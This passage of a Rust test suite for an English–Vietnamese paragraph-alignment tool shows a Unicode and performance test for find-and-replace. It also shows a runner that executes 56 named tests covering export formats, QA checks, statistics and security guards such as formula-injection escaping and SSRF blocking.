        return Err("thay cả khối thành rỗng phải được (khối rỗng vẫn hợp lệ)".into());
    }
    if let Err(e) = export_session(&s, ExportFormat::Tsv) {
        return Err(format!("xuất TSV với khối rỗng phải hợp lệ: {}", e));
    }
    // NFD: substring so THEO KÝ TỰ — "cà phê" NFC không khớp "cà phê" NFD (quy ước công khai)
    let vi_nfd: String = "cà phê đàng đi".nfd().collect();
    let en2 = vec!["NFD test".to_string()];
    let vi2 = vec![vi_nfd.clone()];
    let rows2 = vec![pair_row(0, 0, &en2, &vi2, Status::NeedsReview, None)];
    let mut s2 = manual_session(en2, vi2, rows2);
    let out_nfd = s2
        .replace_all(Side::Vi, "cà phê", "trà", false)
        .map_err(|e| e.to_string())?;
    if out_nfd.changed != 0 {
        return Err(
            "tìm NFC trong chuỗi NFD phải 0 chỗ (so theo ký tự — quy ước công khai)".into(),
        );
    }
    // HIỆU NĂNG: 10.000 hàng đủ hai phía thay "Alpha Corp" (kể cả snapshot cả lô)
    let n = 10_000usize;
    let en3: Vec<String> = (0..n)
        .map(|k| format!("Report {} from Alpha Corp number {}", k, k))
        .collect();
    let vi3: Vec<String> = (0..n)
        .map(|k| format!("Báo cáo {} từ Alpha Corp số {}", k, k))
        .collect();
    let rows3: Vec<Row> = (0..n)
        .map(|k| pair_row(k, k, &en3, &vi3, Status::NeedsReview, None))
        .collect();
    let mut big = manual_session(en3, vi3, rows3);
    let t0 = Instant::now();
    let out_big = big
        .replace_all(Side::Vi, "Alpha Corp", "Tập đoàn Alpha", false)
        .map_err(|e| e.to_string())?;
    let ms = t0.elapsed().as_millis();
    if out_big.changed != n {
        return Err(format!(
            "phiên lớn phải thay đủ {} chỗ, được {}",
            n, out_big.changed
        ));
    }
    if ms >= 1_000 {
        return Err(format!(
            "thay {} hàng mất {} ms — vượt ngân sách 1.000 ms",
            n, ms
        ));
    }
    Ok(())
}

pub fn run_all() -> Vec<TestResult> {
    let tests: Vec<(&str, fn() -> Result<(), String>)> = vec![
        ("01. tách đoạn (dòng trống / dòng đơn / CRLF)", t_split_paragraphs),
        ("02. bất biến I1–I4 trên bộ ngữ liệu chuẩn", t_invariants_corpus),
        ("03. chất lượng: ≥7/9 cặp tự khớp, đúng vị trí", t_quality_auto_matched),
        ("04. xuất: chữ 'none' đúng nguyên văn (TSV/Moses/JSON)", t_export_none_literal),
        ("05. xuất một phía: none ở phía thiếu", t_export_single_side),
        ("06. hai bên rỗng phải báo lỗi rõ ràng", t_both_empty_error),
        ("07. [REGRESSION] panic index 61 — ghép 2 lần, 7 cặp kích thước", t_regression_panic_index_61),
        ("08. [REGRESSION] ghép bài 2, 3, 4 sau khi xuất bài 1", t_multi_article_sequence),
        ("09. cập nhật trạng thái + tách cặp khi bỏ ghép", t_status_update_flow),
        ("10. nhả phiên / lưu-đọc lại / xoá tất cả", t_session_release_and_persist),
        ("11. kẹp ngưỡng (clamp) & tác động ngưỡng", t_threshold_clamp),
        ("12. fold tiếng Việt + chuẩn hoá số (4.000=4,000)", t_fold_and_numbers),
        ("13. cặp giàu số liệu phải tự khớp", t_numbers_alignment),
        ("14. trích HTML: bỏ script/style, giải mã thực thể", t_html_extract),
        ("15. stress fuzz 24 cặp kích thước ngẫu nhiên", t_stress_fuzz),
        ("16. quy ước 4 trạng thái (auto_matched/needs_review/unmatched/human_confirmed)", t_status_enum_contract),
        ("17. xuất sau khi tách cặp: none kề nhau, EN trước VI", t_export_after_split),
        ("18. [REGRESSION] lọc chrom giao diện khi tải URL (nút Ghép hết mờ)", t_boilerplate_filter),
        ("19. [TÍCH HỢP] LaBSE: hoà trộn điểm + engine + đường ống HTTP (service giả lập)", t_labse_integration),
        ("20. [REGRESSION] trích <li> danh sách khi tải URL (SBS mất 3 gạch đầu dòng)", t_list_items_extract),
        ("21. xuất mới: CSV (BOM+escape) / HTML (3 màu) / XLIFF 1.2 — none nguyên văn", t_export_new_formats),
        ("22. [BẢN 2.4] gộp 2 hàng liền kề → 2 EN · 2 VI, xuất đủ 6 định dạng", t_merge_adjacent_and_export),
        ("23. [BẢN 2.4] kịch bản SBS: gộp 3 hàng VI vào 1 EN (1 · 4 VI)", t_merge_one_to_many),
        ("24. [BẢN 2.4] gộp xong tách → đủ từng đoạn gốc, none đúng chỗ", t_merge_split_roundtrip),
        ("25. [BẢN 2.4] gộp cùng phía + xác nhận một phía (human_confirmed)", t_merge_one_side_and_human_confirm),
        ("26. [BẢN 2.5] kéo khối VI mồ côi vào hàng khác + đổi chỗ + hoàn tác/làm lại nguyên xi", t_block_move_and_undo),
        ("27. [BẢN 2.5] tách khối thành hàng riêng (⇥) + prune hàng rỗng + hoàn tác", t_block_detach_newrow),
        ("28. [BẢN 2.5] Rescan: chấm lại điểm hàng (công thức + ngưỡng + từ chối một phía)", t_rescan_row),
        ("29. [BẢN 2.5] xuất sau khi tráo chéo khối: tha thứ I3, I1 vẫn gắt", t_export_after_reorder),
        ("30. [BẢN 2.5] đầu vào xấu của move_block + no-op không đẩy history", t_move_invalid),
        ("31. [BẢN 2.6][REGRESSION] mega-menu/ribbon/modal/comment theo class — tuoitre.vn", t_mega_menu_extract),
        ("32. [BẢN 2.6] caption/credit ảnh trong figure: bỏ credit ngắn, giữ caption dài", t_caption_credit_extract),
        ("33. [BẢN 2.6] \"link farm\": mật độ link nhận diện menu không cần class", t_link_farm_extract),
        ("34. [BẢN 2.7] Excel .xlsx: tô màu ô theo trạng thái hàng (đọc lại zip kiểm fill từng hàng)", t_export_xlsx_colors),
        ("35. [BẢN 2.7] xlsx hàng gộp nhiều đoạn chung một ô + alias excel + meta file", t_export_xlsx_merged),
        ("36. [AUDIT 2026-10-18] CSV/TSV chống chèn công thức: đầu ô = + - @ thêm dấu '", t_export_formula_guard),
        ("37. [AUDIT 2026-10-18] xlsx ghi CHUỖI không phải công thức (không có <f>)", t_export_xlsx_no_formula),
        ("38. [AUDIT 2026-10-18] loại ký tự điều khiển khi xuất (XLIFF/HTML hợp lệ)", t_export_control_chars),
        ("39. [AUDIT 2026-10-18] chặn SSRF (địa chỉ nội bộ) + phân giải redirect", t_fetch_ssrf_guard),
        ("40. [BẢN 2.8] xuất TMX 1.2 (bộ nhớ dịch cho CAT: header đủ, tu/tuv/prop, none nguyên văn, escape)", t_export_tmx),
        ("41. [BẢN 2.8] Rescan toàn bộ: 1 nhấn chấm hết hàng đủ hai phía + 1 snapshot hoàn tác nguyên xi", t_rescan_all),
        ("42. [BẢN 2.9] Thống kê số từ: corpus chuẩn đúng số đếm tay + phân vùng bảo toàn + byStatus", t_stats_counts_corpus),
        ("43. [BẢN 2.9] Quy ước đếm biên: NFD/NFC cùng số từ lẫn ký tự · CRLF/NBSP/emoji ZWJ · trắng thuần = 0", t_stats_nfd_crlf_edge),
        ("44. [BẢN 2.9] Phân vùng hàng phản ánh đúng tách cặp (paired/en_only/vi_only + byStatus từng bước)", t_stats_rows_partition),
        ("45. [BẢN 2.9] Thống kê thuần đọc (không đổi phiên/histo) + 10.000 đoạn < 300 ms", t_stats_readonly_perf),
        ("46. [BẢN 2.9] QA 8 kiểm: dương tính từng loại — đúng hàng, đúng mức, đúng thứ tự + JSON camelCase", t_qa_detects_all_eight),
        ("47. [BẢN 2.9] QA không báo oan: 4.000≡4,000 · don't · «» cân · từ hợp lệ không dấu · sạch = 0", t_qa_no_false_positives),
        ("48. [BẢN 2.9] QA số liệu: bắt dời thập phân (3.5→35) · thiếu/thừa lần lặp · $ % không tính", t_qa_numeric_edges),
        ("49. [BẢN 2.9] QA hàng một phía: kiểm 1/4/5/6/8 chạy phía có mặt, kiểm 2/3 bỏ; phiên rỗng = 0", t_qa_single_side),
        ("50. [BẢN 2.9] QA thuần đọc + tất định + không phụ thuộc LaBSE (rescan cos=1 không đổi báo cáo)", t_qa_readonly_labse_independent),
        ("51. [BẢN 2.9] QA hiệu năng: 10.000 đoạn đủ hai phía soát dưới 1.000 ms, 0 báo oan", t_qa_perf_10k),
        ("52. [BẢN 2.9] Thay thế: 3 chỗ đúng nội dung + sync tài liệu gốc + 1 snapshot + undo/redo nguyên xi", t_replace_basic_undo_redo),
        ("53. [BẢN 2.9] Thay thế: hoa thường (The/the/THE) + chọn cột (EN không đụng VI) + không chồng lấn", t_replace_case_and_column),
        ("54. [BẢN 2.9] Thay thế đầu vào xấu: rỗng/trắng/tìm==thay bị chặn · 0 khớp = 0 snapshot, 0 đổi", t_replace_invalid_inputs),
        ("55. [BẢN 2.9] Thay lô lớn 10 chỗ/5 hàng đúng 1 snapshot · hàng gộp thay đủ cả 2 khối VI", t_replace_batch_and_merged_rows),
        ("56. [BẢN 2.9] Thay thế biên Unicode (dấu/emoji ZWJ/khối rỗng/NFD) + 10.000 hàng < 1 s", t_replace_unicode_edges_perf),
    ];

    let mut results = Vec::with_capacity(tests.len());
    for (name, f) in tests {
        let t0 = Instant::now();
        let handle = std::thread::spawn(move || f());
        let (passed, detail) = match handle.join() {
            Ok(Ok(())) => (true, "đạt".to_string()),
            Ok(Err(e)) => (false, e),
            Err(_) => (
                false,
                "PANIC — bài kiểm làm sập thread (đây chính là lỗi bản 1.x)".to_string(),
            ),
        };
        results.push(TestResult {
            name: name.to_string(),
            passed,
            duration_ms: t0.elapsed().as_millis() as u64,
            detail,
        });
    }
    results
}
